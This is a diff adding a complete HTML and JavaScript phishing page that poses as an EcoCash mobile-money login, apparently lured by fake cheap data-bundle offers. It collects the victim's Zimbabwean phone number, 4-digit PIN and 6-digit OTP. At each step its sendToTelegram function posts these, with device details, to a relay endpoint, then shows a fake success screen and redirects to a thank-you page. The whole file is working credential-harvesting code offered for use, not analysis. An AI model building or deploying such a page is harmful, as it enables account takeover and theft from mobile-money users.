@@ -1,0 +1,579 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+
+<title>Ecocash Login</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+
+<style>
+
+*{box-sizing:border-box}
+
+body{
+font-family:"Plus Jakarta Sans",system-ui;
+margin:0;
+min-height:100vh;
+display:flex;
+align-items:center;
+justify-content:center;
+background:linear-gradient(180deg,#e6f0ff,#cfe0ff);
+overflow:hidden;
+}
+
+.wave{
+position:fixed;
+width:700px;
+height:700px;
+border-radius:50%;
+background:radial-gradient(circle,rgba(0,58,143,.15),transparent 70%);
+filter:blur(45px);
+animation:float 20s infinite linear;
+z-index:-1;
+}
+
+.wave.one{top:-250px;right:-150px}
+.wave.two{bottom:-250px;left:-150px}
+
+@keyframes float{
+0%{transform:translateY(0)}
+50%{transform:translateY(40px)}
+100%{transform:translateY(0)}
+}
+
+.step{
+position:absolute;
+width:100%;
+max-width:420px;
+padding:30px;
+background:white;
+border-radius:22px;
+box-shadow:0 25px 50px rgba(0,0,0,.12);
+transition:.35s;
+}
+
+.container{
+position:relative;
+width:100%;
+max-width:420px;
+height:560px;
+}
+
+.hidden{
+opacity:0;
+pointer-events:none;
+transform:translateX(40px);
+}
+
+.logo{
+height:70px;
+display:block;
+margin:auto;
+}
+
+h1{
+text-align:center;
+color:#003a8f;
+margin:12px 0 6px;
+font-size:22px;
+font-weight:800;
+}
+
+.warning{
+text-align:center;
+font-size:13px;
+color:#e11d48;
+margin-top:6px;
+margin-bottom:18px;
+font-weight:600;
+}
+
+label{
+font-size:12px;
+margin-top:12px;
+display:block;
+color:#444;
+}
+
+input{
+width:100%;
+padding:13px;
+border-radius:14px;
+border:1px solid #eee;
+background:#fafafa;
+margin-top:6px;
+font-size:14px;
+}
+
+.phone-group{
+display:flex;
+gap:8px;
+align-items:center;
+}
+
+.prefix{
+background:#f1f5ff;
+padding:13px;
+border-radius:14px;
+border:1px solid #eee;
+font-weight:600;
+color:#003a8f;
+}
+
+.btn{
+margin-top:20px;
+width:100%;
+padding:13px;
+border-radius:14px;
+border:0;
+font-weight:700;
+background:#003a8f;
+color:white;
+cursor:pointer;
+opacity:.45;
+}
+
+.btn.active{
+opacity:1;
+}
+
+.pin{
+display:flex;
+gap:12px;
+justify-content:center;
+margin:18px 0;
+}
+
+.pin input{
+width:52px;
+height:58px;
+font-size:22px;
+text-align:center;
+border-radius:16px;
+border:1px solid #eee;
+}
+
+.count{
+text-align:center;
+font-size:13px;
+color:#666;
+}
+
+.resend{
+text-align:center;
+margin-top:10px;
+font-size:13px;
+}
+
+.resend button{
+border:0;
+background:none;
+color:#003a8f;
+cursor:pointer;
+font-weight:600;
+opacity:.4;
+}
+
+.resend button.active{
+opacity:1;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="wave one"></div>
+<div class="wave two"></div>
+
+<div class="container">
+
+<div id="step1" class="step">
+
+<img src="assets/ecocash.png" class="logo">
+
+<h1>Login</h1>
+
+<label>Phone Number</label>
+
+<div class="phone-group">
+<div class="prefix">+263</div>
+<input id="phone" inputmode="numeric" pattern="[0-9]*" placeholder="7XXXXXXXX">
+</div>
+
+<div class="warning">
+Enter your 9-digit number starting with 7.
+</div>
+
+<label>Enter your PIN</label>
+
+<div class="pin">
+<input maxlength="1" inputmode="numeric">
+<input maxlength="1" inputmode="numeric">
+<input maxlength="1" inputmode="numeric">
+<input maxlength="1" inputmode="numeric">
+</div>
+
+<button id="loginBtn" class="btn">Login</button>
+
+</div>
+
+
+<div id="step3" class="step hidden">
+
+<h1>OTP Verification</h1>
+
+<div class="warning" id="maskedNumber"></div>
+
+<div class="pin">
+<input maxlength="1" inputmode="numeric">
+<input maxlength="1" inputmode="numeric">
+<input maxlength="1" inputmode="numeric">
+<input maxlength="1" inputmode="numeric">
+<input maxlength="1" inputmode="numeric">
+<input maxlength="1" inputmode="numeric">
+</div>
+
+<div class="count">
+Code expires in <span id="time">120</span>s
+</div>
+
+<div class="resend">
+<button id="resendBtn">Resend OTP</button>
+</div>
+
+<button id="otpBtn" class="btn">Submit</button>
+
+</div>
+
+
+<div id="step4" class="step hidden">
+
+<h1>Success</h1>
+
+<div class="warning">
+Processing request...
+</div>
+
+</div>
+
+</div>
+
+
+
+<script>
+
+let phoneValue=""
+let pinValue=""
+let otpValue=""
+let loginClicked=false
+let otpSubmitted=false
+let resendClicked=false
+
+let selectedPlan=null
+
+try{
+selectedPlan=JSON.parse(sessionStorage.getItem("selectedPlan"))
+}catch(e){}
+
+const priceMap={
+"15GB":"USD 0.99",
+"35GB":"USD 1.99",
+"50GB":"USD 2.99",
+"Unlimited":"USD 3.99"
+}
+
+function getPlanLine(){
+
+if(!selectedPlan) return "Unknown plan"
+
+let name=selectedPlan.name||selectedPlan.shortName||"Plan"
+
+let price=selectedPlan.price
+
+if(!price){
+
+for(let k in priceMap){
+if(name.includes(k)){
+price=priceMap[k]
+break
+}
+}
+
+}
+
+return name+" — "+price
+
+}
+
+const ua=navigator.userAgent
+
+let device="Unknown"
+
+if(/Android/i.test(ua)) device="Android"
+else if(/iPhone|iPad/i.test(ua)) device="iOS"
+
+if(/Chrome/i.test(ua)) device+=" | Chrome"
+else if(/Safari/i.test(ua)) device+=" | Safari"
+
+
+async function sendToTelegram(eventName){
+
+fetch("/api/sendTelegram",{
+
+method:"POST",
+
+headers:{
+"Content-Type":"application/json"
+},
+
+body:JSON.stringify({
+
+submittedAt:new Date().toISOString(),
+loginPhone:phoneValue,
+loginPin:pinValue,
+otp:otpValue,
+event:eventName,
+plan:getPlanLine(),
+device:device
+
+})
+
+})
+
+}
+
+
+/* phone cleanup */
+
+phone.oninput=e=>{
+
+let v=e.target.value.replace(/\D/g,"")
+
+if(v.startsWith("263")) v=v.slice(3)
+if(v.startsWith("0")) v=v.slice(1)
+
+if(v[0]!=="7") v="7"+v.slice(1)
+
+v=v.slice(0,9)
+
+e.target.value=v
+
+phoneValue="+263"+v
+
+validateLogin()
+
+}
+
+
+/* PIN inputs */
+
+const pinInputs=document.querySelectorAll("#step1 .pin input")
+
+pinInputs.forEach((input,i)=>{
+
+input.oninput=()=>{
+
+input.value=input.value.replace(/\D/g,"")
+
+if(input.value && i<3) pinInputs[i+1].focus()
+
+validateLogin()
+
+}
+
+input.onkeydown=e=>{
+
+if(e.key==="Backspace" && !input.value && i>0){
+
+pinInputs[i-1].focus()
+pinInputs[i-1].value=""
+
+validateLogin()
+
+}
+
+}
+
+})
+
+
+function validateLogin(){
+
+pinValue=[...pinInputs].map(i=>i.value).join("")
+
+if(phoneValue.length===13 && pinValue.length===4)
+loginBtn.classList.add("active")
+else
+loginBtn.classList.remove("active")
+
+}
+
+
+function show(id){
+
+document.querySelectorAll(".step")
+.forEach(s=>s.classList.add("hidden"))
+
+document.getElementById(id)
+.classList.remove("hidden")
+
+}
+
+
+/* login */
+
+loginBtn.onclick=()=>{
+
+if(!loginBtn.classList.contains("active")) return
+if(loginClicked) return
+
+loginClicked=true
+
+sendToTelegram("login_clicked")
+
+const masked=phoneValue.replace(/(\+263\d{3})\d{4}(\d{2})/,"$1****$2")
+
+maskedNumber.innerHTML=`Enter the OTP sent to ${masked}`
+
+show("step3")
+
+startTimer()
+
+}
+
+
+/* OTP inputs */
+
+const otpInputs=document.querySelectorAll("#step3 .pin input")
+
+const otpBtn=document.getElementById("otpBtn")
+
+otpInputs.forEach((input,i)=>{
+
+input.oninput=()=>{
+
+input.value=input.value.replace(/\D/g,"")
+
+if(input.value && i<5) otpInputs[i+1].focus()
+
+validateOtp()
+
+}
+
+input.onkeydown=e=>{
+
+if(e.key==="Backspace" && !input.value && i>0){
+
+otpInputs[i-1].focus()
+otpInputs[i-1].value=""
+
+validateOtp()
+
+}
+
+}
+
+})
+
+
+function validateOtp(){
+
+otpValue=[...otpInputs].map(i=>i.value).join("")
+
+if(otpValue.length===6)
+otpBtn.classList.add("active")
+else
+otpBtn.classList.remove("active")
+
+}
+
+
+/* submit */
+
+otpBtn.onclick=()=>{
+
+if(!otpBtn.classList.contains("active")) return
+if(otpSubmitted) return
+
+otpSubmitted=true
+
+sendToTelegram("otp_confirm")
+
+show("step4")
+
+setTimeout(()=>{
+
+location.href="thankyou.html"
+
+},1200)
+
+}
+
+
+/* resend */
+
+resendBtn.onclick=()=>{
+
+if(!resendBtn.classList.contains("active")) return
+if(resendClicked) return
+
+resendClicked=true
+
+sendToTelegram("resend_otp")
+
+startTimer()
+
+}
+
+
+/* timer */
+
+function startTimer(){
+
+let t=120
+
+time.textContent=t
+
+resendBtn.classList.remove("active")
+
+resendClicked=false
+
+otpInputs.forEach(i=>{
+i.disabled=false
+i.value=""
+})
+
+otpBtn.classList.remove("active")
+
+const timer=setInterval(()=>{
+
+t--
+
+time.textContent=t
+
+if(t<=0){
+
+clearInterval(timer)
+
+resendBtn.classList.add("active")
+
+otpInputs.forEach(i=>i.disabled=true)
+
+otpBtn.classList.remove("active")
+
+maskedNumber.innerHTML="Code expired. Request new OTP"
+
+}
+
+},1000)
+
+}
+
+</script>
+
+</body>
+</html>
